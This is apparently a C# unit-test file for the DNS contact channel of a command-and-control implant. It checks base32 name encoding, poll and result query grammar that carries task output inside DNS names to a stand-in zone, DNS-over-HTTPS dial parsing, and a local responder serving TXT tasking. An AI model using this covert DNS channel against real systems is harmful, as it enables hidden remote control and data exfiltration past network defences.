using System.Net;
using System.Net.Sockets;
using System.Text;
using Rod.Implant.Internal;

namespace Rod.Implant.Tests;

/// <summary>
/// The DNS contact client's own halves (extending/implants.md, the DNS
/// contract): the name grammar (base32 labels, the poll and result shapes)
/// and the dial's wire exchange, driven against a test-local UDP responder
/// that answers the RFC 1035 shape the listener serves -- so the client's
/// question encoding and answer parsing are pinned without coupling the
/// implant's tests to the server assembly.
/// </summary>
public class DnsContactTests
{
    [Fact]
    public void Base32_RendersLowercaseRfc4648_WithoutPadding()
    {
        // The RFC 4648 test vector "foobar" -> MZXW6YTBPI======.
        Assert.Equal("mzxw6ytboi", DnsNames.Encode("foobar"u8.ToArray()));
        Assert.Equal("aa", DnsNames.Encode(new byte[] { 0 }));

        var roundTripped = DnsNames.Decode(DnsNames.Encode("whoami"u8.ToArray()));
        Assert.NotNull(roundTripped);
        Assert.Equal("whoami", Encoding.UTF8.GetString(roundTripped!));
        Assert.Null(DnsNames.Decode("not base32!"));
    }

    [Fact]
    public void Names_RenderThePollAndResultGrammar()
    {
        const string id = "7c9e6679-7425-40de-944b-e07fc1f90ae7";
        const string zone = "c2.example.test";
        var idLabel = DnsNames.Encode(id);
        var taskLabel = DnsNames.Encode("task-1");

        var poll = DnsNames.PollName(id, zone);
        Assert.Equal($"p.{idLabel}.{zone}", poll);

        // One terminal chunk carrying bytes, and the empty-output shape
        // (the bare 'e' label: base32 of zero bytes would be an empty
        // label, which a DNS name cannot carry).
        var terminal = DnsNames.ResultName(id, "task-1", succeeded: true, 0, terminal: true, "ok"u8.ToArray(), zone);
        Assert.Equal($"r.{taskLabel}.s.0.t.{DnsNames.Encode("ok"u8.ToArray())}.{idLabel}.{zone}", terminal);

        var empty = DnsNames.ResultName(id, "task-1", succeeded: false, 0, terminal: true, Array.Empty<byte>(), zone);
        Assert.Equal($"r.{taskLabel}.f.0.t.e.{idLabel}.{zone}", empty);

        var more = DnsNames.ResultName(id, "task-1", succeeded: true, 3, terminal: false, "xx"u8.ToArray(), zone);
        Assert.Equal($"r.{taskLabel}.s.3.m.{DnsNames.Encode("xx"u8.ToArray())}.{idLabel}.{zone}", more);
    }

    [Fact]
    public void Dial_ParsesResolverPortZoneAndCarriage()
    {
        Assert.Equal(("127.0.0.1", 5300, "c2.example.test", false), DnsDial.Parse("dns://127.0.0.1:5300/c2.example.test"));
        Assert.Equal(("ns.example.test", 53, "c2.example.test", false), DnsDial.Parse("dns://ns.example.test/C2.Example.Test."));
        Assert.Equal(("::1", 5300, "c2.example.test", false), DnsDial.Parse("dns://[::1]:5300/c2.example.test"));

        // The system-resolver dial: a bare zone rides the host's own
        // configured resolver, the production shape for a delegated zone.
        Assert.Equal((null, 53, "c2.example.test", false), DnsDial.Parse("dns://c2.example.test"));

        // The DoH carriage: the same grammar over HTTPS, port 443 default.
        Assert.Equal(("doh.example.test", 443, "c2.example.test", true), DnsDial.Parse("doh://doh.example.test/c2.example.test"));
        Assert.Equal(("10.9.8.7", 8443, "c2.example.test", true), DnsDial.Parse("doh://10.9.8.7:8443/c2.example.test"));

        // DoH names its resolver: the carriage is an HTTPS URL the host's
        // own configuration does not carry.
        Assert.Throws<NotSupportedException>(() => DnsDial.Parse("doh://c2.example.test"));
        Assert.Throws<NotSupportedException>(() => DnsDial.Parse("dns://ns.example.test/"));
    }

    [Fact]
    public void Dial_TheSystemResolver_ReportsTheHostsConfiguredServer()
    {
        // The system dial must name a resolver, whichever way the host is
        // configured: loopback when nothing else exists (the lab shape).
        var (host, port) = DnsDial.SystemResolver();
        Assert.Equal(53, port);
        Assert.True(System.Net.IPAddress.TryParse(host, out _), $"not an address: {host}");
    }

    [Fact]
    public async Task Query_ExchangesTheTxtPayload_WithAResponderSpeakingTheListenerShape()
    {
        var payload = DnsNames.Encode(new byte[] { 1, 2, 3, 4, 5 });
        using var responder = new UdpResponder(name => name == "p.test.c2.example.test" ? payload : "");
        var seen = responder.RunAsync();

        var bytes = await DnsDial.QueryAsync(
            $"dns://127.0.0.1:{responder.Port}/c2.example.test",
            "p.test.c2.example.test", null, CancellationToken.None);

        Assert.NotNull(bytes);
        Assert.Equal(new byte[] { 1, 2, 3, 4, 5 }, bytes);
        Assert.Equal("p.test.c2.example.test", await seen);
    }

    [Fact]
    public async Task Query_ANonBase32Answer_IsARefusalNotAPayload()
    {
        using var responder = new UdpResponder(_ => "!!! not base32 !!!");
        _ = responder.RunAsync();

        await Assert.ThrowsAsync<FormatException>(
            () => DnsDial.QueryAsync(
                $"dns://127.0.0.1:{responder.Port}/c2.example.test",
                "p.test.c2.example.test", null, CancellationToken.None));
    }

    // A minimal test-local responder: one query, one answer, speaking the
    // RFC 1035 subset the listener serves -- the echoed question, a TXT
    // answer by compression pointer, the id echoed back.
    private sealed class UdpResponder : IDisposable
    {
        private readonly UdpClient _udp = new(new IPEndPoint(IPAddress.Loopback, 0));

        public int Port => ((IPEndPoint)_udp.Client.LocalEndPoint!).Port;

        private readonly Func<string, string> _answer;

        public UdpResponder(Func<string, string> answer) => _answer = answer;

        public async Task<string> RunAsync()
        {
            var received = await _udp.ReceiveAsync();
            var query = received.Buffer;
            // The question spans byte 12 to the OPT record (the trailing 11
            // bytes: root name, type 41, class, ttl, rdlen); its own last
            // four bytes are the qtype and qclass after the name.
            var question = query[12..(query.Length - 11)];
            var name = ReadName(question[..^4]);
            var answer = BuildAnswer(query, _answer(name));
            await _udp.SendAsync(answer, answer.Length, received.RemoteEndPoint);
            return name;
        }

        private static string ReadName(byte[] name)
        {
            var labels = new List<string>();
            var offset = 0;
            while (offset < name.Length && name[offset] != 0)
            {
                var length = name[offset];
                labels.Add(Encoding.ASCII.GetString(name, offset + 1, length));
                offset += 1 + length;
            }
            return string.Join('.', labels);
        }

        private static byte[] BuildAnswer(byte[] query, string payload)
        {
            var question = query[12..(query.Length - 11)];
            var buffer = new List<byte>(64);
            buffer.Add(query[0]);
            buffer.Add(query[1]); // the echoed id
            AppendU16(buffer, 0x8180); // QR | RD | RA, NOERROR
            AppendU16(buffer, 1); // the echoed question
            AppendU16(buffer, 1); // one TXT answer
            AppendU16(buffer, 0);
            AppendU16(buffer, 0);
            buffer.AddRange(question);
            buffer.Add(0xC0); // the answer's name: a pointer to the question
            buffer.Add(0x0C);
            AppendU16(buffer, 16); // TXT
            AppendU16(buffer, 1); // IN
            AppendU32(buffer, 0); // TTL
            AppendU16(buffer, (ushort)(payload.Length + 1));
            buffer.Add((byte)payload.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(payload));
            return buffer.ToArray();
        }

        private static void AppendU16(List<byte> buffer, ushort value)
        {
            buffer.Add((byte)(value >> 8));
            buffer.Add((byte)value);
        }

        private static void AppendU32(List<byte> buffer, uint value)
        {
            buffer.Add((byte)(value >> 24));
            buffer.Add((byte)(value >> 16));
            buffer.Add((byte)(value >> 8));
            buffer.Add((byte)value);
        }

        public void Dispose() => _udp.Dispose();
    }
}
